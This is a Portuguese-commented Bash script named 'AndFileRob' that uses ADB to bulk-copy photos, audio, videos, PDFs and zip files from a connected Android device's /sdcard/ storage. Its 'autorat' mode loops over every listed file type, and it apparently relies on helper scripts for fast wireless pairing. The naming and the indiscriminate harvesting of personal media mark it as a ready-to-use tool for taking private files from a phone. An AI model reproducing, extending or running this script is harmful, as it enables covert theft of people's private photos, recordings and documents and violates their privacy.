#!/bin/bash  
  
# Definindo códigos de cores ANSI  
GREEN='\033[0;32m'  
BLUE='\033[0;34m'     # INFO  
YELLOW='\033[1;33m'   # WARNING  
RED='\033[0;31m'      # ERROR  
NC='\033[0m'          # No Color (reset)  

# Formatar a data no formato dd-mm-aaaa_hh-mm  
data=$(date +"%d-%m-%Y_%H-%M")  

# Verificação de dependências  
check_dependencies() {
    if ! command -v adb &> /dev/null; then
        log_message error "ADB não está instalado ou não foi encontrado no PATH."
        exit 1
    fi
}

# Função para exibir mensagens com diferentes níveis de verbosidade  
log_message() {  
    local level=$1  
    local message=$2  

    case $level in  
        "info") echo -e "${BLUE}[INFO]: ${message}${NC}" ;;  
        "warning") echo -e "${YELLOW}[WARNING]: ${message}${NC}" ;;  
        "error") echo -e "${RED}[ERROR]: ${message}${NC}" ;;  
        *) echo -e "[UNKNOWN]: ${message}" ;;  
    esac  
}  

# Função para exibir o banner  
banner() {  
    local color=$RED
    if adb devices | grep -w "device" &> /dev/null; then  
        color=$GREEN
    fi

    cat <<EOF
${color}.-----------------------------------------------------------.
${color}|                     _ ______ _ _      _____       _       |
${color}|     /\             | |  ____(_) |    |  __ \     | |      |
${color}|    /  \   _ __   __| | |__   _| | ___| |__) |___ | |__    |
${color}|   / /\ \ | '_ \ / _  |  __| | | |/ _ \  _  // _ \| '_ \   |
${color}|  / ____ \| | | | (_| | |    | | |  __/ | \ \ (_) | |_) |  |
${color}| /_/    \_\_| |_|\__,_|_|    |_|_|\___|_|  \_\___/|_.__/   |
${color}|                                                           |
${color}|                                                   V 1.5   |
${color}'-----------------------------------------------------------'${NC}
EOF
}  

# Função para executar o script fastpair.sh  
run_fastpair() {  
    if [[ -f fastpair.sh ]]; then  
        bash fastpair.sh || exit 1
    else  
        log_message error "Script 'fastpair.sh' não encontrado."  
        exit 1  
    fi  
}  

# Função para executar o script fastconnect.sh  
run_fastconnect() {  
    if [[ -f fastconnect.sh ]]; then  
        bash fastconnect.sh || exit 1
    else  
        log_message error "Script 'fastconnect.sh' não encontrado."  
        exit 1  
    fi  
}  

# Função para extração automática de arquivos  
autorat() {  
    local filenames=("jpg" "png" "jpeg" "gif" "raw" "webp" "opus" "mp4" "pdf" "zip")  
    
    log_message info "Iniciando extração de arquivos..."
    
    for element in "${filenames[@]}"; do
        log_message info "Procurando arquivos .$element no dispositivo..."
        
        if ! andfilerob "$element"; then
            log_message warning "Nenhum arquivo .$element encontrado ou erro na extração."
        else
            log_message info "Arquivos .$element extraídos com sucesso."
        fi
    done
    
    log_message info "Processo de extração concluído!"
}  

# Função para baixar arquivos do dispositivo Android  
andfilerob() {  
    local filename=$1  
    local path="./AndFileRob_Dumps/$filename"
    mkdir -p "$path"

    log_message info "Data atual: $data"
    log_message info "Salvando arquivos .$filename em: $path"
    
    sleep 1
    
    # Lista arquivos no Android, filtra apenas os que ainda não foram baixados
    adb shell find /sdcard/ -type f -iname "*.$filename" | while read -r file; do
        local basename=$(basename "$file")
        local local_path="$path/$basename"
        
        if [[ ! -f "$local_path" ]]; then
            adb pull "$file" "$local_path" && log_message info "Arquivo $basename baixado."
        else
            log_message warning "Arquivo $basename já existe, ignorando."
        fi
    done
}  

# Função para exibir a ajuda  
usage() {  
    echo "Uso: $0 [-p] [-c] [-a] [-f <extensão>] [-h]"  
    echo "  -p          Executa o script fastpair.sh"  
    echo "  -c          Executa o script fastconnect.sh"  
    echo "  -a          Executa o script autorat (extração de arquivos)"  
    echo "  -f <extensão> Executa o script andfilerob para a extensão especificada"  
    echo "  -h          Exibe esta ajuda"  
    exit 1  
}  

# Verificação de dependências  
check_dependencies  

# Parser de argumentos  
while getopts ":pcaf:h" opt; do  
    case "$opt" in  
        p) run_fastpair ;;  
        c) run_fastconnect ;;  
        a) autorat ;;  # Agora corretamente tratado como uma opção sem argumento
        f) andfilerob "$OPTARG" ;;  
        h) usage ;;  
        \?) log_message error "Opção inválida: -$OPTARG"; usage ;;  
        :) log_message error "A opção -$OPTARG requer um argumento."; usage ;;  
    esac  
done  

# Se nenhum argumento foi passado, exibir a ajuda  
if [ $OPTIND -eq 1 ]; then  
    usage  
fi  

# Exibir o banner apenas se um argumento for passado  
if [ $OPTIND -gt 1 ]; then  
    banner  
fi
